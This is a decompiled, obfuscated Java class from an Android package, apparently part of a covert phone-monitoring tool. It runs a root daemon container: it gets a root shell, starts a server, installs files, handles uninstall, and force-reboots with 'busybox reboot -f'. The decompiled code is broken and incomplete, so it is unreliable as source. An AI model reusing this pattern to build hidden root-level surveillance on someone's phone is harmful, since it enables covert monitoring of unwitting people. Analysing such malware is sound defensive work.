package com.vvt.daemon;

import android.content.Context;
import com.fx.daemon.exception.UninstallationException;
import com.vvt.appengine.AppEngineException;
import com.vvt.base.RunningMode;
import com.vvt.polymorphic.AppContainerInfo;
import com.vvt.shell.CannotGetRootShellException;
import com.vvt.shell.ShellUtil;
import com.vvt.shell.f;
import java.io.FileNotFoundException;
import java.util.ArrayList;

public class i
  extends com.vvt.polymorphic.a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  private AppContainerInfo d;
  private com.vvt.appengine.a e;
  private Context f;
  private String g;
  
  public i(Context paramContext, String paramString)
  {
    this.f = paramContext;
    this.g = paramString;
  }
  
  private static void a(Context paramContext, String paramString)
  {
    boolean bool1 = b;
    if (bool1) {}
    f localf = null;
    try
    {
      bool1 = b;
      if (bool1) {}
      String str = "%s reboot -f";
      boolean bool2 = true;
      Object[] arrayOfObject = new Object[bool2];
      arrayOfObject[0] = paramString;
      str = String.format(str, arrayOfObject);
      bool2 = b;
      if (bool2) {}
      localf = f.b();
      localf.a(str);
      com.fx.daemon.b.a(paramContext);
      if (localf != null) {
        localf.d();
      }
      bool1 = b;
      if (bool1) {}
      return;
    }
    finally
    {
      if (localf != null) {
        localf.d();
      }
    }
  }
  
  private AppContainerInfo m()
  {
    AppContainerInfo localAppContainerInfo = this.d;
    if (localAppContainerInfo == null)
    {
      localAppContainerInfo = new com/vvt/polymorphic/AppContainerInfo;
      localAppContainerInfo.<init>();
      this.d = localAppContainerInfo;
      localAppContainerInfo = this.d;
      String str = com.vvt.m.b.c;
      localAppContainerInfo.load(str);
    }
    return this.d;
  }
  
  protected com.vvt.appengine.a a()
  {
    return this.e;
  }
  
  protected void b()
  {
    boolean bool1 = a;
    if (bool1) {}
    String str = m().getCommandStartServer();
    boolean bool2 = b;
    if (bool2) {}
    f localf = f.a();
    localf.a(str);
    localf.d();
    bool1 = b;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
  }
  
  protected boolean c()
  {
    com.vvt.t.a locala = com.vvt.t.a.a();
    Object localObject1 = this.g;
    Object localObject3 = "fx.log";
    locala.a((String)localObject1, (String)localObject3);
    locala = com.vvt.t.a.a();
    int i = 6;
    locala.a(i);
    boolean bool2 = a;
    if (bool2) {}
    bool2 = false;
    locala = null;
    localObject1 = new com/vvt/appengine/a;
    localObject3 = this.f;
    String str = this.g;
    RunningMode localRunningMode = RunningMode.FULL;
    ((com.vvt.appengine.a)localObject1).<init>((Context)localObject3, str, localRunningMode);
    this.e = ((com.vvt.appengine.a)localObject1);
    try
    {
      localObject1 = this.e;
      ((com.vvt.appengine.a)localObject1).b();
      bool2 = true;
    }
    catch (AppEngineException localAppEngineException)
    {
      for (;;)
      {
        boolean bool1 = c;
        if (bool1) {}
        this.e.c();
        bool1 = false;
        Object localObject2 = null;
        this.e = null;
      }
    }
    bool1 = a;
    if (bool1) {}
    return bool2;
  }
  
  protected boolean d()
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = false;
    try
    {
      com.vvt.appengine.a locala = this.e;
      if (locala != null)
      {
        locala = this.e;
        locala.c();
        bool2 = false;
        locala = null;
        this.e = null;
      }
      bool1 = true;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = c;
        if (!bool2) {}
      }
    }
    bool2 = a;
    if (bool2) {}
    return bool1;
  }
  
  protected boolean e()
  {
    boolean bool1 = a;
    if (bool1) {}
    String str1 = m().getPackageName();
    Context localContext = this.f;
    boolean bool2 = com.vvt.polymorphic.b.a(localContext, str1);
    if (bool2) {
      bool1 = true;
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return bool1;
      try
      {
        localContext = this.f;
        String str2 = com.vvt.m.b.c;
        bool1 = com.vvt.polymorphic.b.a(localContext, str2, str1);
      }
      catch (FileNotFoundException localFileNotFoundException)
      {
        bool1 = c;
        if (bool1) {}
        bool1 = false;
        Object localObject = null;
      }
    }
  }
  
  protected boolean f()
  {
    boolean bool1 = true;
    boolean bool2 = b;
    if (bool2) {}
    bool2 = b;
    if (bool2) {}
    ShellUtil.a(bool1);
    String str1 = this.g;
    String str2 = m().getWorkingDirectory();
    ArrayList localArrayList = com.vvt.polymorphic.b.a(str1);
    ShellUtil.a(str1, str2, localArrayList);
    bool2 = b;
    if (bool2) {}
    str1 = null;
    ShellUtil.a(false);
    bool2 = b;
    if (bool2) {}
    return bool1;
  }
  
  protected void g()
  {
    bool = b;
    if (bool) {}
    try
    {
      bool = b;
      if (bool) {}
      a locala = new com/vvt/daemon/a;
      locala.<init>();
      com.vvt.polymorphic.b.a(locala);
    }
    catch (UninstallationException localUninstallationException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    bool = b;
    if (bool) {}
  }
  
  protected String h()
  {
    return "RootProcessContainer";
  }
  
  protected boolean i()
  {
    bool1 = true;
    bool2 = false;
    for (;;)
    {
      try
      {
        localObject1 = new com/vvt/daemon/a;
        ((a)localObject1).<init>();
        com.vvt.polymorphic.b.a((com.fx.daemon.a)localObject1);
        localObject1 = "%s/%s";
        i = 2;
      }
      catch (UninstallationException localUninstallationException)
      {
        Object localObject1;
        int i;
        Object localObject2;
        int j;
        String str;
        bool1 = c;
        if (!bool1) {
          continue;
        }
        bool1 = false;
        continue;
      }
      try
      {
        localObject2 = new Object[i];
        j = 0;
        str = this.g;
        localObject2[0] = str;
        j = 1;
        str = "busybox";
        localObject2[j] = str;
        localObject1 = String.format((String)localObject1, (Object[])localObject2);
        localObject2 = this.f;
        a((Context)localObject2, (String)localObject1);
      }
      catch (CannotGetRootShellException localCannotGetRootShellException)
      {
        bool2 = c;
        if (!bool2) {
          continue;
        }
      }
    }
    return bool1;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/daemon/i.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */